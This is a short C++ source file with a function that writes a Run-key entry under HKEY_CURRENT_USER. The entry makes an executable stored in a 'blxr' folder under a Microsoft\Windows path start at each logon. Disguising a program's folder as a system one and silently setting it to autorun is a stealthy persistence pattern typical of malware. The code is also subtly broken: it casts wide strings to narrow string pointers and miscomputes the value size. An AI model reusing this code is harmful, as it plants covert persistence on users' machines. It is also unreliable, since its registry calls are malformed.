#include "sys.h"
#include "stream.h"

int sys::AddToRegistry(const std::string &name) {
  std::string win_path = stream::GetPath(R"(\Microsoft\Windows\blxr\)");
  std::wstring w_win_path = std::wstring(win_path.begin(), win_path.end());
  std::wstring w_name = std::wstring(name.begin(), name.end());

  std::string full_path = win_path + name + ".exe";
  HKEY hkey = nullptr;
  LSTATUS ret_rck = RegCreateKeyEx(HKEY_CURRENT_USER,
								   reinterpret_cast<LPCSTR>(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
								   0,
								   nullptr,
								   REG_OPTION_NON_VOLATILE,
								   KEY_SET_VALUE,
								   nullptr,
								   &hkey,
								   nullptr);
  if (ret_rck!=ERROR_SUCCESS) {
	return ret_rck;
  }
  RegSetValueEx(hkey,
				reinterpret_cast<LPCSTR>(w_name.c_str()),
				0,
				REG_SZ,
				(BYTE *)full_path.c_str(),
				(full_path.size() + 1)*sizeof(wchar_t));
  //RegQueryValueEx(hkey, full_path.c_str(), nullptr, nullptr, nullptr, nullptr);
  return 0;
}